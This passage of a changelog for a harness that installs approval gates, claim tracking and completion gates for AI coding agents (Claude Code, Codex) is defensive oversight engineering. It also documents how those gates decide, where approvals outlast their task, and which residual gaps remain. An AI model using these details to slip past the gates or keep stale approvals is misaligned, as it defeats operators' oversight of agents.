...
- Outside `approval_lifecycle: { mode: session }`, a live session approval written by an earlier release carries no task binding and is refused once: run `harness approve understanding` again after upgrading. From now on a session approval stops counting when the agent claims a different task (pre-approve a batch with `--task a b c`). Under `mode: session` nothing changes.
- Downgrading fails closed: an earlier release treats session and branch-protection markers written by 0.59.0 as forged; re-approve with the older binary after a downgrade.
- If you keep your own `expire_on_tool_match` list, add `mcp__agent-tasks__task_merge` to it so a review-then-`task_merge` path expires the approval.
- A plain `harness apply` now reuses the runtime the last apply used (for a record written by an earlier release it is inferred from the generated files and named in the output). If you alternate runtimes, pass `--runtime claude-code` (or `--target`) explicitly.

### Changed

- **The understanding gate's approval now expires on the same boundary as the active-claim marker, and the session approval marker is bound to the task it was granted for** (task `5018c0c4`, operator decisions: align, then bind the session marker to the task). Expiry: the PostToolUse expiry hooks (`harness pack hook post-tool-use` and the Codex `codex-post-tool-use` sibling) share `matchPostToolUseBoundary`, which asks the one decider, `claimEffectForAgentTasksTool`, with the event's `tool_response` for every listed agent-tasks claim lifecycle verb (`ACTIVE_CLAIM_TOOL_NAMES`); a "claim kept" answer is not a boundary. `task_finish` to `review` keeps the session and task approval markers; `task_finish` to `done`, `task_abandon`, `task_merge` and `tasks_transition` to `done` expire them; an absent or unreadable `task_finish` result expires (the decider's fail-safe `release`). The former local `tasks_transition` status filter is replaced by the same decider (same outcome), and its skip diagnostic now reads `<tool> keeps the work claim per the active-claim decider`. `pull_requests_merge`, a listed `task_submit_pr` and a listed `task_start` still expire on list membership. Binding: every session marker `writeApprovalMarker` writes (the `harness approve understanding` CLI and the hook's auto-approval path) now records, as a signed `claimTaskId` field, the task id of the active claim at that moment (`null` when none is held); outside `approval_lifecycle: { mode: session }`, the PreToolUse gates (Claude and Codex), the subagent-start in-flight hand-off and `harness delegate`'s parent check accept the session marker only while the current active claim has that same id (`checkSessionApprovalMarker`). Under `mode: session` the binding is not applied (operator decision): the session marker, bound or unbound, counts for every task until `max_age`, as that mode documents; the field is still written, so leaving `mode: session` takes effect on the next check. A different task, or no claim where one was recorded (or the reverse), blocks exactly like a missing marker, with a diagnostic that says the approval belongs to another task (on stderr for the Claude hook, whose stdout deny reason stays the generic one; in the block reason for the Codex hook), and never reads as an expired approval. So, outside `mode: session`, an approval no longer carries over to the next task when the previous one was completed outside the session (merged in the UI or on GitHub, moved to `done` by a webhook), where no PostToolUse hook can expire anything. Resuming the same task id keeps the approval; the task-scoped markers (`--task`, the active-claim auto-resolve) are unchanged. `task_merge` is added to the explicit `expire_on_tool_match` list of every `harness init` scaffold (full, team, and the interactive composer) and of `docs/examples/full-manifest.yaml`: the runtime boundary list comes from that config alone, so without it the review-then-`task_merge` path would never expire the approval in-session. `task_merge` is also in `DEFAULT_BOUNDARY_TOOL_NAMES`, which only shapes the emitted PostToolUse matcher when no explicit list is configured. Pinned by `tests/cli/pack-hook-post-tool-use.test.ts`, `tests/cli/pack-hook-codex-post-tool-use.test.ts`, `tests/cli/pack-hook-session-approval-task-binding.test.ts` and `tests/cli/init-scaffold-approval-expiry.test.ts`, driven by the real content-block PostToolUse capture `tests/fixtures/track-active-claim/real-posttooluse-task-finish-2.1.280.json`. Upgrade notes: outside `mode: session`, a session marker written by an earlier release carries no binding and is not accepted, so a live session needs one fresh `harness approve understanding` after the upgrade, and a session approval stops counting when the agent claims a different task (pre-approve a batch with `--task a b c` to avoid a prompt per task); under `approval_lifecycle: { mode: session }` nothing changes, including the documented residual that an out-of-band completion followed by a `task_start` on another task keeps the approval until `max_age`; operators with their own `expire_on_tool_match` list add `mcp__agent-tasks__task_merge` to it if they merge through `task_merge`. A downgrade to an earlier release fails closed: its binary does not know the signed `claimTaskId` field, so it rejects every session and branch-protection marker written by this release as forged (not merely unapproved); re-approve with the older binary after a downgrade.

### Fixed

- **`harness apply` without `--runtime` now reuses the runtime the last apply used instead of silently switching to `claude-code`** (task `b9e6d63c`). After `harness apply --runtime codex`, a plain `harness apply` used to regenerate the runtime-specific files (policy-pack `instructions.md`, `settings.json` instead of `codex/config.toml`) for `claude-code`, report `applied N file(s)`, and neither `--dry-run` nor the apply said the runtime had changed. `.last-apply` now records the runtime (`runtime` field), and apply without `--runtime` (including `--install`) reuses it and prints `runtime: codex (from last apply; pass --runtime to change)`. A `.last-apply` written by an older release has no such field: apply then reads the runtime off its files map (only `codex/config.toml` means codex, only `opencode/opencode.json` opencode, only `settings.json` claude-code) and prints `runtime: codex (inferred from the last apply's generated files; pass --runtime to change)`; when the map holds both `settings.json` and `codex/config.toml` (a machine that applied claude-code and later codex), the recorded policy-pack `instructions.md` entries decide when every one names the same runtime in its `## Runtime` section; when the map is still ambiguous it uses `claude-code` and prints `runtime: claude-code (default; the last apply did not record a runtime and generated files for claude-code and codex; pass --runtime codex to keep codex)`, or `runtime: claude-code (default; the last apply did not record a runtime, pass --runtime to choose)` when the map names no runtime. An explicit `--runtime` that differs from the previous one is honoured, and both `--dry-run` and the apply print `runtime: <old> -> <new> (switching from the last apply's runtime)`. `--target` without `--runtime` implies `claude-code` (it wires Claude Code's settings.json) and prints `runtime: claude-code (implied by --target)`, or `runtime: codex -> claude-code (--target implies claude-code)` after a codex apply; an explicit `--runtime codex` or `--runtime opencode` with `--target` is still refused. `harness smoke` and the `harness init --interactive` claude-code wire step pass `claude-code` explicitly. `harness smoke` keeps the runtime `.last-apply` records (new `apply()` option `preserveRecordedRuntime`): after a codex apply it prints `runtime: claude-code for smoke; the recorded runtime codex is kept, the next harness apply restores it`, and the next plain apply reuses codex and rewrites the codex files. `harness pack remove --force` keeps the recorded runtime when it prunes the pack's entries from `.last-apply` (it used to rebuild the record without it, so the next plain apply fell back to reading the files map). For an older record the `instructions.md` entries count only for the packs its own manifest snapshot lists (enabled ones), so an entry left over from a pack a later apply no longer had does not decide the runtime; without a readable snapshot every entry counts. An `--install` refusal for an inferred runtime says `inferred from the last apply's generated files` instead of `reused from the last apply`. With no `.last-apply` the default stays `claude-code`; an apply that changes nothing else stamps the runtime into a record that lacks it. A non-string `runtime` in `.last-apply` is ignored like an unknown value instead of failing every reader of the record. The `--json` result carries `runtime`, `runtimeSource`, `previousRuntime` and, for an ambiguous older record, `runtimeCandidates`. `harness diff --since-apply` is unchanged: it compares `.last-apply` against disk and never regenerates, so it has no runtime to select. Pinned by `tests/cli/apply/apply-runtime-reuse.test.ts` (with a fixture of the merged older record's shape), `tests/cli/smoke/smoke.test.ts` and `tests/cli/pack.test.ts`.

- **`harness apply --runtime codex --install` keeps a symlinked (dotfiles-managed) `~/.codex/config.toml` a symlink** (task `1637fbc8`). The install wrote through `atomicWriteFile`, whose temp-file rename replaced the link with a regular file and left the link's target (typically a dotfiles repo) unchanged, so the two silently diverged. `planCodexConfigInstall` now resolves a symlinked config path with `realpath` and plans against the resolved regular file: the atomic write's temp file is created in the target's own directory (so the rename stays on one filesystem), the target's file mode is preserved, and every link in the chain is left untouched. The backup holds the target's previous content with the target's mode but sits beside the link (for example `~/.codex/config.toml.harness-backup-<timestamp>`), never beside the target: the config holds secrets, and the target's directory is typically a dotfiles git work tree. The plan, the `--install` result and the `--json` outcome report the real file written as `configPath` (also shown by `--dry-run`) and the link as `linkPath` (absent for a regular file); the summary and the `harness init` wizard's install line add `(via symlink <link>)`, and a refusal that points at the `.harness-backup-*` files names the link's backup location. A dangling link (the refusal names the missing end of the chain), an unresolvable chain (a loop, a permission error) or a link to anything other than a regular file (such as a directory) is refused with a `CodexInstallRefusalError` naming the link, and nothing is written. `atomicWriteFile` itself and non-symlink config paths (including a regular config inside a symlinked `~/.codex` directory) are unchanged. Pinned by fixtures in `tests/cli/apply/apply-codex-runtime.test.ts` and `tests/cli/init-interactive.test.ts`.
...
- **`harness apply --runtime codex --install` no longer creates and announces an empty backup file when no `~/.codex/config.toml` existed before the install** (task `461ec064`). `planCodexConfigInstall` now records whether the config path already held a file (`configExisted`, distinguishing "no prior file" from "an existing, possibly empty, prior file"), and `writeCodexConfigInstall` skips the `.harness-backup-*` write entirely when it did not, leaving `backupPath` unset on the result; the CLI's applied-output line and `formatNextSteps`'s next-steps lede were already gated on `backupPath` being present, so a fresh install now reports the write with no backup line. Installing over an existing config, including one that is empty, still backs it up unchanged (pinned by its own test), and the install refusal messages now say to restore from the most recent `.harness-backup-*` file only if one exists. Pinned by a fresh-install test in `tests/cli/apply/apply-codex-runtime.test.ts` for the library result (no `backupPath`, no `.harness-backup-*` sibling file) and for the CLI's applied output and next-steps text (no backup line), both failing at the pre-fix implementation and passing at head.

- **The solution-acceptance completion-gate's deny text no longer names `solution_evaluate` as the next action when an attempt for the same id is already live** (task `58c65bc9`). The converge list's step 2 previously read `mcp__grounding-mcp__solution_evaluate({ id: "<id>" })` for every null-verdict reading, including reading (2) (an attempt is live), sitting directly above the reconnect paragraph's own "do not call it again" / "Never re-call `solution_evaluate`" sentences appended right below it for that same reading, so the agent-facing deny disagreed with itself on the one action it named twice. `convergeStep2For` in `src/cli/pack/hook-solution-acceptance.ts` now renders step 2 as a function of the reading: readings (1) (never evaluated) and (3) (an unreadable marker), and every non-null-verdict deny, keep the unqualified `solution_evaluate` step (wording unchanged apart from a colon in place of a dash); reading (2) instead names `solution_evaluate_status` / `solution_evaluate_result` (the same poll tools the reconnect paragraph itself names) and points at the reconnect paragraph, with no `solution_evaluate(` call instruction anywhere in that reading's deny text. `solution-acceptance-reconnect.ts` and its rendered `instructions.md` "Reconnecting vs. retrying" section are unchanged. Pinned by a dedicated test asserting the reading-(2) deny carries no `solution_evaluate(` call instruction and that its step 2 itself names both poll tools, plus assertions on the reading-(1) and reading-(3) fixtures that step 2 still names `solution_evaluate` unqualified.

- `harness apply --runtime codex --install`'s split-block refusal now always names the actual foreign table header, including when the table is wedged directly between a `# harness hook:` comment and the `[[hooks.*]]` table that comment belongs to (previously printed `(unknown)` in that shape, because the owned-region scan had already backed the zone start off to only blank or comment lines preceding the found marker, so the pre-marker header lookup found no content line there; it now also looks just past the marker's own line when that happens). Covered for a table wedged after a lone `# harness hook:` comment and for a second hook's comment directly following the first hook's content line. Safety was unaffected in every case (refusal still fires, exit `EX_FAIL`, file left untouched, no secret value ever echoed, now also pinned for this wedged-after-comment shape in the no-echo matrix): only the naming in the message text was wrong. (task `25a4c53f`)

- **The stay-in-scope hook's audit row and reminder now carry the created task id under the real Claude Code MCP `tool_response` shape** (task `b5e65f5e`). `extractTaskId` in `src/cli/pack/hook-stay-in-scope.ts` used to read `tool_response.task.id` and `tool_response.id` as a plain object only, but Claude Code sends MCP `tool_response` as a content-block array (`[{ type: "text", text: "<json>" }]`); the watched tool is a create verb without a `taskId` input, so the audit row's `taskId` was always `null` and the reminder omitted `task=<id>`. It now reuses the shared unwrap already pinned for the active-claim tracker (`taskIdFromToolResponse`, `src/runtime/task-providers/agent-tasks.ts`) instead of a second, plain-object-only parser; the plain-object shape stays supported through the same unwrap. The bare top-level `tool_response.id` fallback (never a real Claude Code or Codex shape) is dropped: only `task.id` is read now. Pinned by a real-shape fixture (`tests/fixtures/pack-hook-stay-in-scope/real-posttooluse-task-create-2.1.280.json`, shaped like the genuine capture `tests/fixtures/track-active-claim/real-posttooluse-task-finish-2.1.280.json`) that fails at the pre-fix implementation and passes at head, asserting both the audit row and the reminder text; `agent-primitives probe --pre 'npm run build'` on the hook's test file kills both reverting to the plain-object-only read and computing the reminder note through that old read alone.

- **Four shipped source comments citing this changelog's now-emptied post-release-cut section pointed at nothing, once the entries they described shipped in 0.49.0** (task `ba7958e1`): `src/cli/policy/intercept.ts`, `src/runtime/kubectl-target-parse.ts`, `src/cli/doctor/types.ts` and `src/cli/validate/checks.ts` now cite the shift-proof `CHANGELOG.md:#0.49.0` anchor instead, matching the convention already used elsewhere (e.g. `src/cli/approve/understanding.ts`). A new `check:shipped-unreleased-pointer` gate (`scripts/check-shipped-unreleased-pointer.mjs`, wired into CI right after Changelog coverage) scans every shipped file (`src/`, README.md, `scripts/runtime-reality-docker-probe.mjs`) for a dangling pointer to that section, unconditionally, so a new one cannot land again; this changelog's own file is excluded from the scan (its history legitimately narrates past states in prose; see the script's own header for the measured false positive that drove that exclusion).

- **`harness apply --runtime codex --install`'s next-steps hint no longer says "Nothing is installed into Codex yet" right after a successful install** (task `dd7a3f23`). `formatNextSteps` (`src/cli/apply/next-steps.ts`) previously decided the Codex lede from `anyChanged` (whether the generated files changed), never from the install outcome itself, so the always-"nothing installed" text survived a real write. The CLI (`src/cli/index.ts`) now passes the `--install` result (`codexConfigInstall.configPath`, `.written`, `.backupPath`) through as a new optional `codexInstall` field on `NextStepsContext`; when present the hint reports what was installed, where, and the backup path on a write, or states the config already has the harness-managed block on a no-op install (config already current), and neither branch claims a write that did not happen. Without `--install` the text is unchanged. Pinned by formatter tests in `tests/cli/apply/next-steps.test.ts` and CLI-level tests in `tests/cli/apply/apply-codex-runtime.test.ts`. Mutation probe (`agent-primitives probe --pre 'npm run build'`) collapsing the install branch back to the plain generated text killed by the new tests.

## [0.58.1] - 2026-09-23

### Fixed

- **`harness apply --runtime codex --install` no longer deletes foreign (non harness-owned) tables when a previous install's END marker had drifted past them** (task `6a037359`). `findManagedRange` used to trust `text.indexOf(CODEX_MANAGED_END, begin)` unconditionally: a dogfood run on 2026-09-23 upgrading 0.56.0 to 0.58.0 found the marker sitting after Codex's own `[hooks.state]` trust table, `[marketplaces.*]`, `[plugins.*]` and `[tui]` tables, so the install deleted all of them. The region end is now computed independently of the END marker's position (a new `scanOwnedContentEnd` stops at the first foreign table, the same `NON_HOOK_TABLE_RE` the legacy no-END path already used), a stray END found beyond that point is excised and a fresh one is re-stamped right after the regenerated block, and a comment block Codex (or an operator) attaches to the next foreign table is never folded into the replaced region. A foreign table wedged between two harness hook tables, or a moved/duplicated BEGIN marker, now refuses loudly (`assertNoSplitBlock`) instead of guessing. `harness apply --dry-run --runtime codex --install` and the post-install summary now also name every hook id being removed (a hook id present in the old block absent from the new one) and every foreign section preserved, by its table header. Pinned in `tests/cli/apply/apply-codex-runtime.test.ts` with a fixture shaped like the real evidence file (neutral placeholder paths): the fixture fails against the pre-fix implementation (every foreign table and the trailing operator content are deleted) and passes at head; a dry-run test asserts the named removed-hook-id and preserved-foreign-section lists; a split-block fixture asserts the loud refusal. Mutation probes (`agent-primitives probe --pre 'npm run build'`) restoring blind END trust and removing the stray-END cleanup both killed by the fixture.

  **Upgrade note:** Codex tracks per-hook trust in `[hooks.state]` (`<config path>:<event>:<group index>:<handler index>` keys, `trusted_hash` computed over a normalized hook identity, not raw source text; see `codex-rs/hooks/src/engine/discovery.rs`'s `hook_hash`/`hook_trust_status` and `codex-rs/hooks/src/lib.rs`'s `hook_key`, openai/codex commit `30fc6864cc1318121eca1843c217fe00ce1212f1`). Harness never writes or forges `trusted_hash`; it only stops deleting the table that holds it. A hook whose emitted command, matcher, or `[[hooks.<Event>]]` table position changes (the key embeds the table's ordinal index for that event) gets a new hash/key and reverts to `Untrusted` until the operator re-approves it in Codex, same as any hand-edited hook; this was already true before this fix, it is just no longer masked by the whole trust table being deleted. The UG Codex `post-tool-use` hook disappearing from an install is separate and expected: it is suppressed under `approval_lifecycle: { mode: session }` (`resolveExpireOnToolMatch`, `src/policy-packs/builtin/understanding-before-execution.ts`), pinned by `tests/policy-packs/expand.test.ts` ("Codex adapter contributes..." for the default-present case, "...suppressed when approval_lifecycle.mode = session..." for the opt-out); re-running the install under `mode: session` correctly removes that stale block, it is not a regression. A command, matcher, or timeout change (also an `async`/`status_message` change) yields a new hash under the SAME key; a position change instead moves which key the entry lives under; either way the affected hook's status reads `Modified` or `Untrusted` and Codex will not run it until re-approved. Separately, a `[hooks.state]` entry can carry a positional `enabled` override for that same key; adding or removing a hook earlier in an event's list shifts every later hook's ordinal index, which can land an operator's own `enabled = false` override onto a DIFFERENT hook than the one they disabled. Review Codex's hook list after any install that changes the hook roster (adds, removes, or reorders a hook for an event), not only after one that changes a single hook's command. Also: since harness 0.57.0 (stay-in-scope became an explicit opt-in), a re-install removes the codex "stay in scope" hook block unless `stay_in_scope` is enabled in the manifest -- expected, not a regression, same class as the `post-tool-use` disappearance above.

  Also hardened in the same change (task `6a037359`): a dedicated fixture in `tests/cli/apply/apply-codex-runtime.test.ts` for each guard that previously had no fixture exercising it -- an operator comment sitting directly above the first foreign table (stays attached to that table, not folded into the replaced block, and appears exactly once); two harness-managed BEGIN markers (refused, file untouched); a BEGIN with no END where a foreign table is followed further down by a real `# harness hook:` comment (refused, since the block boundaries can no longer be read as a plain line scan); a managed block whose END marker is followed by a trailing operator comment at EOF (kept, not silently replaced away; this holds only when the END marker is present: in a config with no END marker, a trailing comment after the last harness hook table is still read as part of the block and replaced, a known limitation); exact (not `arrayContaining`) equality on `foreignSectionsPreserved` and `removedHookIds`, plus one exact byte-for-byte equality on the whole installed output for the drifted fixture. A CLI-level test (through the built program, not only the library function) asserts `--dry-run`'s and the applied install's own stdout for the removed-hook-block and preserved-foreign-section lines. The refusal itself is more actionable: it names the RESOLVED config path (never a hard-coded `~/.codex`), the first foreign table (its bracketed header only) and the line number of the first line beyond it that still looks like harness content (never that line's own text), and either tells the operator to move that table below the END marker or delete the lines between BEGIN and END (when one exists), or, when there is no END marker at all, to add one after the last harness hook table or move the foreign table below it instead (telling the operator to move something below a marker that does not exist would be nonsensical); a duplicate-BEGIN refusal tells the operator to delete the entire unwanted BEGIN/END pair, including its own marker lines and source-prefix comment, not just the lines between them. Either refusal offers the `.harness-backup-*` restore only as a last resort with an explicit warning that it discards any Codex state (hook trust, marketplaces, plugins) written since that backup; it throws a dedicated `CodexInstallRefusalError` (a `HarnessExitError` at `EX_FAIL`) instead of a plain `Error`, and `--json` emits a structured `{ outcome: "codex-install-refuse", configPath, error }` object on stdout the same way `target-exists-refuse`/`drift-refuse` already do, instead of only the plain-text message reaching stderr. The install's own permissions no longer widen a secret-bearing config: it preserves the EXISTING file's mode for both the rewritten config and its `.harness-backup-*` copy (0640 as well as 0600, pinned), defaulting to `0600` (not `atomicWriteFile`'s own `0644`) only when creating a config that did not exist before. `foreignSectionsPreserved` prints a namespace's ROOT with a wildcard and its table count when more than one table collapses into it (e.g. `[marketplaces.*] (2 tables)`), instead of silently representing several preserved tables as one indistinguishable header; a single table under a root still prints its own full header. The namespace is the header's first key, or its first two keys under `hooks` (e.g. `[hooks.state.*] (27 tables)`, so Codex's trust table is not reported as `hooks`, which also holds the harness-managed hook arrays), with keys split quote-aware and a trailing comment never part of the namespace or of a printed header. Table-header recognition is a full single-line TOML header shape, quote-aware so a key containing `[`, `]`, `.` or `#` (a real path used as a TOML key, e.g. `[projects."/Users/x/Photos [2024]"]`) is still recognized as one header on every managed-range detection path (a drifted END, no END, and the legacy no-BEGIN path), instead of being misread as ending the header early or as still-owned content; a multi-line array's own continuation line inside a still-owned hook table (e.g. `  [1, 2],`) is never misread as a foreign table header ending the region early. The stray-END search matches a whole trimmed line, not a raw substring, so a foreign single-line value that merely contains the END marker text as a substring is never mistaken for the real stray END. A TOML multi-line string is now tracked by its own opening delimiter (`"""` or `'''`), closed only by that same delimiter, with an escaped quote and a delimiter inside a comment or a single-line string ignored, so a foreign table's own multi-line string value (or a still-owned hook table's own multi-line matcher) can contain a line that reads exactly like a comment, a table header, or even the END marker without corrupting the scan.

  A TOML-parsing safety net now runs after the byte-preserving splice above computes its output, before anything is written: both the current and the about-to-be-written config are parsed with `smol-toml` (a new runtime dependency, pinned `~1.8.0`) and compared. The invariant: both must parse, and once every harness-managed hook event array (`[[hooks.<Event>]]`) is removed from both documents, everything else must come out identical: `[hooks.state]` and every other single-table `hooks.*` key, plus all non-hooks content (`[projects.*]`, `[plugins.*]`, `[marketplaces.*]`, `[mcp_servers.*]`, top-level keys). Any difference refuses via `CodexInstallRefusalError`, naming the first differing key path, with the file left untouched (a `--dry-run` plan hits the same check and reports the same refusal). For that content the net is independent of the header-recognition and multi-line-string fixes above, so a future scanner regression there refuses instead of silently dropping content. It does not cover the hook event arrays themselves: an operator-authored `[[hooks.<Event>]]` entry that the line scan counts as part of the harness-managed block (for example one sitting between the block and a drifted END marker, or after a BEGIN with no END marker) is still replaced without a refusal; tracked as follow-up task `01053b27`. An operator hook entry outside the managed block is kept whatever its header spelling (a trailing comment, a quoted event key). A leading UTF-8 byte order mark is ignored for parsing (the written file keeps it unless the harness block itself starts on the file's first line, which is harmless because Codex's own parser strips it too), and an integer beyond 2^53 (TOML integers are 64-bit) is compared exactly instead of failing the parse. A config the harness parser cannot read refuses with "the TOML parser used by harness could not read this file", the parser's line, column and one-line reason, not a claim that the operator's syntax is wrong; a would-be output that does not parse names an operator-defined inline `hooks` table or inline hook-event array as the likely cause before a harness defect. No refusal quotes a value line of the config or the parser's code frame; only table headers and key paths are named: parse refusals carry only that position and reason (never the parser's code frame, which would echo neighbouring lines such as an API token), and the split-block and duplicate-BEGIN refusals name a line number instead of that line's text.
...
- **Codex `UserPromptSubmit` now injects whenever Codex invokes the hook**
  ...
  stdin, but event dispatch is the injection boundary. Pause remains first;
  disabled-pack and manifest-load failures remain fail-open. A redacted genuine
  Codex 0.156.1 operator fixture backs injection, and blank-prompt input is an
  explicitly synthetic regression case that must still inject.

- **`harness.generated/active-claim` no longer clears on a `task_finish` that lands the task in `review`, and `task_merge` is now a tracked, dispatched verb end to end** (task `c86e3c4a`). `claimEffectForAgentTasksTool` (`src/runtime/task-providers/agent-tasks.ts`), the SINGLE decider for this classification, used to treat every `task_finish` as a release, disagreeing with agent-tasks's own documented v2 semantics (the work claim is cleared going to `done`, kept going to `review`); the two disagreeing left a session wedged (`task_start` on another task returns `already_claimed`, `task_abandon` on the review-state task returns `bad_state`, and the completion gate refuses every push/`task_merge` with "no active-claim task id recorded"). It now takes the tool RESULT as an optional third parameter and reads `task_finish`'s resulting `task.status` (via the new exported `taskFinishResultingStatus`, reading the mcp-server v1 receipt `{ ok, task: { id, status }, deviations? }`): only a resulting status of `review` returns `"none"` (keep); `done`, any other resolvable status, and an unreadable result all return `"release"`. `task_abandon` and `task_merge` both always release. `hook-track-active-claim.ts` no longer re-derives any of this locally (the round-1 fix's own local override is gone): it calls the classifier with `event.tool_response` and only presents the returned effect, one decider, no duplicate logic. `task_merge` is also now a member of `ACTIVE_CLAIM_TOOL_NAMES`, which feeds the generated PostToolUse matcher (`understanding-before-execution.ts`'s `TRACK_ACTIVE_CLAIM_MATCH` / `_CODEX`, both Claude and Codex variants) -- previously `task_merge` was untracked there too, so a real `task_merge` tool call never dispatched to this hook at all; every consumer of `ACTIVE_CLAIM_TOOL_NAMES` was enumerated (`rg`) and only these two matcher constants and this hook's own re-export consume it, none of them treating membership as "claim-acquiring" (acquire vs. release is a separate decision made by the classifier), so widening the set changes only which tools dispatch to this hook. The recovery path (`task_start` on the SAME review-state task) still needs no code change: `writeActiveClaim` already overwrites unconditionally. Pinned by: `tests/cli/pack-hook-track-active-claim.test.ts` (finish-to-done clears, finish-to-review keeps, finish-with-no-result and finish-with-malformed-status both fail safe, `task_merge` clears, review-then-restart recovery); `tests/runtime/task-providers/agent-tasks.test.ts` (the classifier's result-aware decision directly, `taskFinishResultingStatus`'s extraction, `task_merge` in `ACTIVE_CLAIM_TOOL_NAMES`); `tests/policy-packs/expand.test.ts` and `tests/cli/apply/generate-codex-config.test.ts` (the generated Claude and Codex matchers both now match `task_merge`, both the exact string and a live regex test, plus a negative control). Mutation probes (`agent-primitives probe --pre 'npm run build'`) reverting to clear-on-every-finish, keeping the marker on `done`, and removing `task_merge` from the tracked set all killed by these fixtures. Upgrade: the review-keep fix is in the hook itself and needs no re-apply; to dispatch `task_merge` to the hook, re-run `harness apply` (and re-merge the generated settings into your live Claude Code settings or Codex config) so the widened PostToolUse matcher is installed.

  - **Round-2 review fix (commit `8dfba1b`): the round-1 fix was INERT in production -- Claude Code's real MCP `tool_response` is a content-block array, not the plain receipt object round 1 read** (task `c86e3c4a`, HIGH). Live capture, claude 2.1.280: a PostToolUse event for an MCP tool call carries `tool_response` shaped `[{ "type": "text", "text": "<json>" }]`, not `{ ok, task: { status } }` directly; `taskFinishResultingStatus` read only the latter, so `taskFinishResultingStatus(toolResponse)` always answered `null` against the real payload and `claimEffectForAgentTasksTool` always fell to its fail-safe `"release"` branch, exactly reproducing the pre-fix wedge the round-1 fix claimed to close. `taskFinishResultingStatus` (and the new `taskIdFromToolResponse`) now unwrap, recursively: (a) the plain receipt object itself (unchanged, also covers the `include:["task"]` full-task variant); (b) the measured content-block array, first `type: "text"` block JSON-parsed; (c) an MCP `CallToolResult` object, `{ content: [...] }` (plausible on Codex, **UNMEASURED** here); (d) a bare JSON string. Verbatim redacted live capture committed at `tests/fixtures/track-active-claim/real-posttooluse-task-finish-2.1.280.json`; driven end to end through `runPackHookTrackActiveClaimCli` for both the finish-to-review (marker kept) and finish-to-done (marker cleared, only the status changed from the same capture) outcomes, plus an `include:["task"]` full-object receipt inside the same content-block envelope. Also corrected: the fail-safe rationale in `claimEffectForAgentTasksTool`'s doc comment, this entry, and the pack doc previously said releasing-on-unreadable "costs only" an "ergonomic shortcut" -- the marker actually feeds the FAIL-CLOSED completion gate (`hook-solution-acceptance.ts`'s `readActiveClaim`), so releasing is chosen because a KEPT marker for an already-finished task would misroute that gate, at the cost of a possible wedge, not because the marker is low-stakes. An unreadable result's release now also logs a distinct diagnostic naming the shape it fell back from (`unreadable tool_response, shape=array|string|object|absent`), pinned in tests, so it no longer looks identical to an intentional `done` release in the operator's stderr trail. Separately, `task_abandon` / `task_merge` / a non-review `task_finish` now clear the marker only when it already names the SAME task id as the call acted on (input `taskId`, falling back to the result's `task.id`); a mismatch keeps the marker and logs the near-miss (`kept active-claim <B>: <verb> on <A>`) -- round 1 cleared unconditionally, so a caller holding a work-claim marker for task B lost it to an unrelated `task_merge` (or finish/abandon) on task A, including finishing a REVIEW claim on A while B's work claim was live. Class closure: every `tool_response` consumer under `src/cli/pack/` and `src/runtime/` was enumerated (`rg tool_response`); `hook-stay-in-scope.ts`'s `extractTaskId` reads `tool_response.task.id` / `tool_response.id` through the same plain-object-only accessor this hook had before this fix, so it likely has the identical content-block blind spot against a real Claude Code MCP payload -- reported here as a risk/follow-up, not fixed (out of this task's scope). `hook-post-merge-gate-record.ts`'s `tool_response` reads are for the Bash tool (its own separately-measured `{ stdout, stderr, interrupted }` shape, not an MCP content-block array) and are not the same class. New tests: a golden-fixture describe block (real payload assertion, finish-to-review, finish-to-done, `include:["task"]` full-object variant), a defensive-shapes describe block (`CallToolResult` object, bare JSON string), an unreadable-diagnostic describe block (all four shapes plus a negative control), and an id-equality describe block (task_merge / task_abandon on an unrelated id, same-id clear, review-claim-of-another-task, result-`task.id` fallback, no-marker fail-safe). Mutation probes (`agent-primitives probe --pre 'npm run build'`): the content-block/CallToolResult/string unwrap reverted to plain-object-only (killed by the golden fixture), the id-equality check removed (killed by the marker-B fixture), and the unreadable-shape diagnostic removed (killed) -- plus the three round-1 probes replayed at their moved anchor, still killed.

### Changed

- **`harness pack hook solution-acceptance`'s completion-gate deny text now distinguishes the three `gate.verdict === null` readings instead of appending the same reconnect-vs-retry paragraph to all three** (task `799de976`). The hook reads grounding-mcp's documented attempt-lock anchor (`<verdict dir>/<id>.attempt-lock`, README "Attempt lock anchor" row at `grounding-mcp-v0.12.0`) via `proper-lockfile`'s own read-only `checkSync` (already a harness dependency; no new one added) to tell "an attempt is live" apart from "never evaluated" and "a marker path exists but what is there was not accepted as a verdict"; liveness is three-valued (`live`, `not-live`, `unknown`, through a read-only `checkFileLock` in `src/io/lock.ts`), and a note never asserts an absent attempt or a missing marker when the check could not read; the full reconnect-vs-retry paragraph (`solution-acceptance-reconnect.ts`) is now appended only for the live-attempt reading, and the other two readings get their own short, reading-named line instead; the paragraph's own wording is corrected to say the hook itself read the anchor and detected the live-attempt reading, not that it cannot tell the three readings apart (its shared facts, `RECONNECT_FACT_*` and `renderReconnectInstructionsSection`, stay byte-identical). A lock directory left behind by a dead process is read as stale using the producer's OWN staleness window (`DEFAULT_ATTEMPT_LOCK_STALE_MS = 30_000`, `grounding-mcp-v0.12.0` `solution-attempt-log.ts:102`, the default `acquireAttemptLock` passes to `proper-lockfile` when no caller overrides `staleMs`), so this hook's "live" reading and the producer's reclamation rule agree as long as the producer keeps that default and no caller overrides it: an operational pin re-checked on every grounding-mcp bump, not a guarantee. `instructions.md` and grounding-mcp's lock layout are unchanged. See `docs/policy-packs/solution-acceptance.md`, "Reading the attempt-lock anchor to distinguish the three readings", for the full decision record and source citations. Pinned in `tests/cli/pack-hook-solution-acceptance.test.ts` (one case per reading, the overlap of a live lock with an unreadable marker, a stale-lock regression, two check-error-path regressions, a symlinked anchor) and in `tests/io/lock.test.ts` and a literal-wording pin in `tests/policy-packs/solution-acceptance-reconnect.test.ts`; mutation probes removing the live-attempt branch, neutralising the stale rule, substituting a hand-copied paragraph, flipping the check-error catch arm, and reverting the corrected wording (`agent-primitives probe --pre 'npm run build'`) all killed.

